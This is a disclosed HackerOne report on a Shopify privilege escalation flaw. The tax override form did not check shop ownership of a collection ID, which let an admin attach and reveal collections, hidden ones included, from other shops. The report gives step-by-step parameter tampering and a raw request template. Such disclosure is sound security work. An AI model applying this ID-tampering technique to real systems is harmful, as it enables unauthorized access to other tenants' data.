@@ -1,0 +1,41 @@
+ReportLink:https://hackerone.com/reports/93004
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/supernatural
+ReportedTo:Shopify(shopify)
+BountyAmount:2000.0
+Severity:
+State:Closed
+DateOfDisclosure:14.10.2015 19:45:27
+
+Summary:
+
+Hi
+
+admins can set tax rates in shopify admin panel
+https://SHOP.myshopify.com/admin/settings/taxes/* or ...
+they can add "Tax override" for specific collection, but this action didn't check ShopID! so we can add any collection id, and it will be add to our shop
+
+this also will works for "Hidden" collections on any shop!
+
+
+steps:
+
+-  goto https://SHOP.myshopify.com/admin/settings/taxes/*
+- click on "Add a tax override"
+- click on "Select a collection" and select on of your collection
+- open "Inspect Element"  and find element with name "tax_override[collection_id]"
+- change it to a collection_id from another shop like "137861635" and click on save
+
+done! tax rate will be add to shop, and you can find collection name right in "Tax overrides" table!
+
+Another way is send this request directly:
+
+URL: /admin/settings/taxes/*/override
+
+data:
+
+authenticity_token= __TOKEN__
+tax_override[is_shipping]=false
+tax_override[collection_id]= collection_id
+tax_override[tax_override_regions_attributes][0][zone]=state::TX
+tax_override[tax_override_regions_attributes][0][rate]=50
